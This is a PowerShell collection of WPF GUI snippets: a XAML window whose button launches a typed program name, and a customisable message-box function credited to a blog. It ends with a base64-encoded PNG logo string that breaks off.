
function func_wpf_xaml2
{
    . "$env:ProgramData\powershell_collected_codesnippets_examples.ps1"
<# Author      : Jim Moyle @jimmoyle   GitHub      : https://github.com/JimMoyle/GUIDemo #>

<# syntax which Visual Studio 2015 creates #>
$inputXML = @'
<Window x:Name="MyWindow" x:Class="GUIDemo.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        xmlns:local="clr-namespace:GUIDemo"
        mc:Ignorable="d"
        Title="MainWindow" Height="350" Width="525">
    <Grid Background="#FF1187A8" RenderTransformOrigin="0.216,0.276">
        <Button x:Name="MyButton" Content="Run Program" HorizontalAlignment="Left" Margin="295,224,0,0" VerticalAlignment="Top" Width="75" RenderTransformOrigin="3.948,-3.193"/>
        <Image x:Name="Myimage" HorizontalAlignment="Left" Height="100" Margin="104,72,0,0" VerticalAlignment="Top" Width="100"/>
        <TextBox x:Name="MyTextBox" HorizontalAlignment="Left" Height="23" Margin="86,222,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="157"/>
        <TextBlock HorizontalAlignment="Left" Margin="295,72,0,0" TextWrapping="Wrap" Text="@jimmoyle" VerticalAlignment="Top" FontSize="24"/>
    </Grid>
</Window>
'@


#========================================================
#code from previous script
#========================================================

#Add in the frameworks so that we can create the WPF GUI
Add-Type -AssemblyName presentationframework, presentationcore
#Create empty hashtable into which we will place the GUI objects
$wpf = @{ }
#Grab the content of the Visual Studio xaml file as a string
#$inputXML = Get-Content -Path ".\WPFGUIinTenLines\MainWindow.xaml"
#clean up xml there is syntax which Visual Studio 2015 creates which PoSH can't understand
$inputXMLClean = $inputXML -replace 'mc:Ignorable="d"','' -replace "x:N",'N' -replace 'x:Class=".*?"','' -replace 'd:DesignHeight="\d*?"','' -replace 'd:DesignWidth="\d*?"',''
#change string variable into xml
[xml]$xaml = $inputXMLClean
$reader = New-Object System.Xml.XmlNodeReader $xaml
#read xml data into xaml node reader object
$tempform = [Windows.Markup.XamlReader]::Load($reader)
#select each named node using an Xpath expression.
$namedNodes = $xaml.SelectNodes("//*[@*[contains(translate(name(.),'n','N'),'Name')]]")
#add all the named nodes as members to the $wpf variable, this also adds in the correct type for the objects.
$namedNodes | ForEach-Object {$wpf.Add($_.Name, $tempform.FindName($_.Name))}

#========================================================
#Your Code goes here
#========================================================


#This code runs when the button is clicked
$wpf.MyButton.add_Click({

$programname = $wpf.MytextBox.text

Start-Process $programname

	})

#=======================================================
#End of Your Code
#=======================================================


$wpf.MyWindow.ShowDialog() | Out-Null
}


function func_wpf_msgbox2
{

    Function New-WPFMessageBox {

    # For examples for use, see my blog:
    # https://smsagent.wordpress.com/2017/08/24/a-customisable-wpf-messagebox-for-powershell/
    
    # Define Parameters
    [CmdletBinding()]
    Param
    (
        # The popup Content
        [Parameter(Mandatory=$True,Position=0)]
        [Object]$Content,

        # The window title
        [Parameter(Mandatory=$false,Position=1)]
        [string]$Title,

        # The buttons to add
        [Parameter(Mandatory=$false,Position=2)]
        [ValidateSet('OK','OK-Cancel','Abort-Retry-Ignore','Yes-No-Cancel','Yes-No','Retry-Cancel','Cancel-TryAgain-Continue','None')]
        [array]$ButtonType = 'OK',

        # The buttons to add
        [Parameter(Mandatory=$false,Position=3)]
        [array]$CustomButtons,

        # Content font size
        [Parameter(Mandatory=$false,Position=4)]
        [int]$ContentFontSize = 14,

        # Title font size
        [Parameter(Mandatory=$false,Position=5)]
        [int]$TitleFontSize = 14,

        # BorderThickness
        [Parameter(Mandatory=$false,Position=6)]
        [int]$BorderThickness = 0,

        # CornerRadius
        [Parameter(Mandatory=$false,Position=7)]
        [int]$CornerRadius = 8,

        # ShadowDepth
        [Parameter(Mandatory=$false,Position=8)]
        [int]$ShadowDepth = 3,

        # BlurRadius
        [Parameter(Mandatory=$false,Position=9)]
        [int]$BlurRadius = 20,

        # WindowHost
        [Parameter(Mandatory=$false,Position=10)]
        [object]$WindowHost,

        # Timeout in seconds,
        [Parameter(Mandatory=$false,Position=11)]
        [int]$Timeout,

        # Code for Window Loaded event,
        [Parameter(Mandatory=$false,Position=12)]
        [scriptblock]$OnLoaded,

        # Code for Window Closed event,
        [Parameter(Mandatory=$false,Position=13)]
        [scriptblock]$OnClosed

    )

    # Dynamically Populated parameters
    DynamicParam {
        
        # ContentBackground
        $ContentBackground = 'ContentBackground'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $RuntimeParameterDictionary = New-Object System.Management.Automation.RuntimeDefinedParameterDictionary
        $arrSet = [System.Drawing.Brushes] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.ContentBackground = "White"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($ContentBackground, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($ContentBackground, $RuntimeParameter)
        

        # FontFamily
        $FontFamily = 'FontFamily'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute)  
        $arrSet = [System.Drawing.FontFamily]::Families | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)
        $AttributeCollection.Add($ValidateSetAttribute)
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($FontFamily, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($FontFamily, $RuntimeParameter)
        $PSBoundParameters.FontFamily = "Segui"

        # TitleFontWeight
        $TitleFontWeight = 'TitleFontWeight'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Windows.FontWeights] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.TitleFontWeight = "Normal"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($TitleFontWeight, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($TitleFontWeight, $RuntimeParameter)

        # ContentFontWeight
        $ContentFontWeight = 'ContentFontWeight'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Windows.FontWeights] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.ContentFontWeight = "Normal"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($ContentFontWeight, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($ContentFontWeight, $RuntimeParameter)
        

        # ContentTextForeground
        $ContentTextForeground = 'ContentTextForeground'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Drawing.Brushes] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.ContentTextForeground = "Black"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($ContentTextForeground, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($ContentTextForeground, $RuntimeParameter)

        # TitleTextForeground
        $TitleTextForeground = 'TitleTextForeground'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Drawing.Brushes] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.TitleTextForeground = "Black"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($TitleTextForeground, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($TitleTextForeground, $RuntimeParameter)

        # BorderBrush
        $BorderBrush = 'BorderBrush'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Drawing.Brushes] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.BorderBrush = "Black"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($BorderBrush, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($BorderBrush, $RuntimeParameter)


        # TitleBackground
        $TitleBackground = 'TitleBackground'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Drawing.Brushes] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.TitleBackground = "White"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($TitleBackground, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($TitleBackground, $RuntimeParameter)

        # ButtonTextForeground
        $ButtonTextForeground = 'ButtonTextForeground'
        $AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        $ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        $ParameterAttribute.Mandatory = $False
        $AttributeCollection.Add($ParameterAttribute) 
        $arrSet = [System.Drawing.Brushes] | Get-Member -Static -MemberType Property | Select -ExpandProperty Name 
        $ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        $AttributeCollection.Add($ValidateSetAttribute)
        $PSBoundParameters.ButtonTextForeground = "Black"
        $RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($ButtonTextForeground, [string], $AttributeCollection)
        $RuntimeParameterDictionary.Add($ButtonTextForeground, $RuntimeParameter)

        # Sound
        #$Sound = 'Sound'
        #$AttributeCollection = New-Object System.Collections.ObjectModel.Collection[System.Attribute]
        #$ParameterAttribute = New-Object System.Management.Automation.ParameterAttribute
        #$ParameterAttribute.Mandatory = $False
        #$ParameterAttribute.Position = 14
        #$AttributeCollection.Add($ParameterAttribute) 
        #$arrSet = (Get-ChildItem "$env:SystemDrive\Windows\Media" -Filter Windows* | Select -ExpandProperty Name).Replace('.wav','')
        #$ValidateSetAttribute = New-Object System.Management.Automation.ValidateSetAttribute($arrSet)    
        #$AttributeCollection.Add($ValidateSetAttribute)
        #$RuntimeParameter = New-Object System.Management.Automation.RuntimeDefinedParameter($Sound, [string], $AttributeCollection)
        #$RuntimeParameterDictionary.Add($Sound, $RuntimeParameter)

        return $RuntimeParameterDictionary
    }

    Begin {
        Add-Type -AssemblyName PresentationFramework
    }
    
    Process {

# Define the XAML markup
[XML]$Xaml = @"
<Window 
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        x:Name="Window" Title="" SizeToContent="WidthAndHeight" WindowStartupLocation="CenterScreen" WindowStyle="None" ResizeMode="NoResize" AllowsTransparency="True" Background="Transparent" Opacity="1">
    <Window.Resources>
        <Style TargetType="{x:Type Button}">
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Border>
                            <Grid Background="{TemplateBinding Background}">
                                <ContentPresenter />
                            </Grid>
                        </Border>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
    </Window.Resources>
    <Border x:Name="MainBorder" Margin="10" CornerRadius="$CornerRadius" BorderThickness="$BorderThickness" BorderBrush="$($PSBoundParameters.BorderBrush)" Padding="0" >
        <Border.Effect>
            <DropShadowEffect x:Name="DSE" Color="Black" Direction="270" BlurRadius="$BlurRadius" ShadowDepth="$ShadowDepth" Opacity="0.6" />
        </Border.Effect>
        <Border.Triggers>
            <EventTrigger RoutedEvent="Window.Loaded">
                <BeginStoryboard>
                    <Storyboard>
                        <DoubleAnimation Storyboard.TargetName="DSE" Storyboard.TargetProperty="ShadowDepth" From="0" To="$ShadowDepth" Duration="0:0:1" AutoReverse="False" />
                        <DoubleAnimation Storyboard.TargetName="DSE" Storyboard.TargetProperty="BlurRadius" From="0" To="$BlurRadius" Duration="0:0:1" AutoReverse="False" />
                    </Storyboard>
                </BeginStoryboard>
            </EventTrigger>
        </Border.Triggers>
        <Grid >
            <Border Name="Mask" CornerRadius="$CornerRadius" Background="$($PSBoundParameters.ContentBackground)" />
            <Grid x:Name="Grid" Background="$($PSBoundParameters.ContentBackground)">
                <Grid.OpacityMask>
                    <VisualBrush Visual="{Binding ElementName=Mask}"/>
                </Grid.OpacityMask>
                <StackPanel Name="StackPanel" >                   
                    <TextBox Name="TitleBar" IsReadOnly="True" IsHitTestVisible="False" Text="$Title" Padding="10" FontFamily="$($PSBoundParameters.FontFamily)" FontSize="$TitleFontSize" Foreground="$($PSBoundParameters.TitleTextForeground)" FontWeight="$($PSBoundParameters.TitleFontWeight)" Background="$($PSBoundParameters.TitleBackground)" HorizontalAlignment="Stretch" VerticalAlignment="Center" Width="Auto" HorizontalContentAlignment="Center" BorderThickness="0"/>
                    <DockPanel Name="ContentHost" Margin="0,10,0,10"  >
                    </DockPanel>
                    <DockPanel Name="ButtonHost" LastChildFill="False" HorizontalAlignment="Center" >
                    </DockPanel>
                </StackPanel>
            </Grid>
        </Grid>
    </Border>
</Window>
"@

[XML]$ButtonXaml = @"
<Button xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" Width="Auto" Height="30" FontFamily="Segui" FontSize="16" Background="Transparent" Foreground="White" BorderThickness="1" Margin="10" Padding="20,0,20,0" HorizontalAlignment="Right" Cursor="Hand"/>
"@

[XML]$ButtonTextXaml = @"
<TextBlock xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" FontFamily="$($PSBoundParameters.FontFamily)" FontSize="16" Background="Transparent" Foreground="$($PSBoundParameters.ButtonTextForeground)" Padding="20,5,20,5" HorizontalAlignment="Center" VerticalAlignment="Center"/>
"@

[XML]$ContentTextXaml = @"
<TextBlock xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" Text="$Content" Foreground="$($PSBoundParameters.ContentTextForeground)" DockPanel.Dock="Right" HorizontalAlignment="Center" VerticalAlignment="Center" FontFamily="$($PSBoundParameters.FontFamily)" FontSize="$ContentFontSize" FontWeight="$($PSBoundParameters.ContentFontWeight)" TextWrapping="Wrap" Height="Auto" MaxWidth="500" MinWidth="50" Padding="10"/>
"@

    # Load the window from XAML
    $Window = [Windows.Markup.XamlReader]::Load((New-Object -TypeName System.Xml.XmlNodeReader -ArgumentList $xaml))

    # Custom function to add a button
    Function Add-Button {
        Param($Content)
        $Button = [Windows.Markup.XamlReader]::Load((New-Object -TypeName System.Xml.XmlNodeReader -ArgumentList $ButtonXaml))
        $ButtonText = [Windows.Markup.XamlReader]::Load((New-Object -TypeName System.Xml.XmlNodeReader -ArgumentList $ButtonTextXaml))
        $ButtonText.Text = "$Content"
        $Button.Content = $ButtonText
        $Button.Add_MouseEnter({
            $This.Content.FontSize = "17"
        })
        $Button.Add_MouseLeave({
            $This.Content.FontSize = "16"
        })
        $Button.Add_Click({
            $Window.Close()
            Write-host $This.Content.Text
        })
        $Window.FindName('ButtonHost').AddChild($Button)
    }

    # Add buttons
    If ($ButtonType -eq "OK")
    {
        Add-Button -Content "OK"
    }

    If ($ButtonType -eq "OK-Cancel")
    {
        Add-Button -Content "OK"
        Add-Button -Content "Cancel"
    }

    If ($ButtonType -eq "Abort-Retry-Ignore")
    {
        Add-Button -Content "Abort"
        Add-Button -Content "Retry"
        Add-Button -Content "Ignore"
    }

    If ($ButtonType -eq "Yes-No-Cancel")
    {
        Add-Button -Content "Yes"
        Add-Button -Content "No"
        Add-Button -Content "Cancel"
    }

    If ($ButtonType -eq "Yes-No")
    {
        Add-Button -Content "Yes"
        Add-Button -Content "No"
    }

    If ($ButtonType -eq "Retry-Cancel")
    {
        Add-Button -Content "Retry"
        Add-Button -Content "Cancel"
    }

    If ($ButtonType -eq "Cancel-TryAgain-Continue")
    {
        Add-Button -Content "Cancel"
        Add-Button -Content "TryAgain"
        Add-Button -Content "Continue"
    }

    If ($ButtonType -eq "None" -and $CustomButtons)
    {
        Foreach ($CustomButton in $CustomButtons)
        {
            Add-Button -Content "$CustomButton"
        }
    }

    # Remove the title bar if no title is provided
    If ($Title -eq "")
    {
        $TitleBar = $Window.FindName('TitleBar')
        $Window.FindName('StackPanel').Children.Remove($TitleBar)
    }

    # Add the Content
    If ($Content -is [String])
    {
        # Replace double quotes with single to avoid quote issues in strings
        If ($Content -match '"')
        {
            $Content = $Content.Replace('"',"'")
        }
        
        # Use a text box for a string value...
        $ContentTextBox = [Windows.Markup.XamlReader]::Load((New-Object -TypeName System.Xml.XmlNodeReader -ArgumentList $ContentTextXaml))
        $Window.FindName('ContentHost').AddChild($ContentTextBox)
    }
    Else
    {
        # ...or add a WPF element as a child
        Try
        {
            $Window.FindName('ContentHost').AddChild($Content) 
        }
        Catch
        {
            $_
        }        
    }

    # Enable window to move when dragged
    $Window.FindName('Grid').Add_MouseLeftButtonDown({
        $Window.DragMove()
    })

    # Activate the window on loading
    If ($OnLoaded)
    {
        $Window.Add_Loaded({
            $This.Activate()
            Invoke-Command $OnLoaded
        })
    }
    Else
    {
        $Window.Add_Loaded({
            $This.Activate()
        })
    }
    

    # Stop the dispatcher timer if exists
    If ($OnClosed)
    {
        $Window.Add_Closed({
            If ($DispatcherTimer)
            {
                $DispatcherTimer.Stop()
            }
            Invoke-Command $OnClosed
        })
    }
    Else
    {
        $Window.Add_Closed({
            If ($DispatcherTimer)
            {
                $DispatcherTimer.Stop()
            }
        })
    }
    

    # If a window host is provided assign it as the owner
    If ($WindowHost)
    {
        $Window.Owner = $WindowHost
        $Window.WindowStartupLocation = "CenterOwner"
    }

    # If a timeout value is provided, use a dispatcher timer to close the window when timeout is reached
    If ($Timeout)
    {
        $Stopwatch = New-object System.Diagnostics.Stopwatch
        $TimerCode = {
            If ($Stopwatch.Elapsed.TotalSeconds -ge $Timeout)
            {
                $Stopwatch.Stop()
                $Window.Close()
            }
        }
        $DispatcherTimer = New-Object -TypeName System.Windows.Threading.DispatcherTimer
        $DispatcherTimer.Interval = [TimeSpan]::FromSeconds(1)
        $DispatcherTimer.Add_Tick($TimerCode)
        $Stopwatch.Start()
        $DispatcherTimer.Start()
    }

    # Play a sound
    If ($($PSBoundParameters.Sound))
    {
        $SoundFile = "$env:SystemDrive\Windows\Media\$($PSBoundParameters.Sound).wav"
        $SoundPlayer = New-Object System.Media.SoundPlayer -ArgumentList $SoundFile
        $SoundPlayer.Add_LoadCompleted({
            $This.Play()
            $This.Dispose()
        })
        $SoundPlayer.LoadAsync()
    }

    # Display the window
    $null = $window.Dispatcher.InvokeAsync{$window.ShowDialog()}.Wait()

    }
}

# Load required assemblies
Add-Type -AssemblyName PresentationFramework, PresentationCore , System.Windows.Forms

#https://smsagent.blog/2018/02/01/create-a-custom-toast-notification-with-wpf-and-powershell/
# Code to create a base64 string from an image file, so that you can include it in the script as a string
#$File = "C:\somepicturefile.png"
#$Image = [System.Drawing.Image]::FromFile($File)
#$MemoryStream = New-Object System.IO.MemoryStream
#$Image.Save($MemoryStream, $Image.RawFormat)
#[System.Byte[]]$Bytes = $MemoryStream.ToArray()
#$Base64 = [System.Convert]::ToBase64String($Bytes)
#$Image.Dispose()
#$MemoryStream.Dispose()
#$Base64 > c:\base64.txt

# Create the custom logo from Base64 string
$Base64 = "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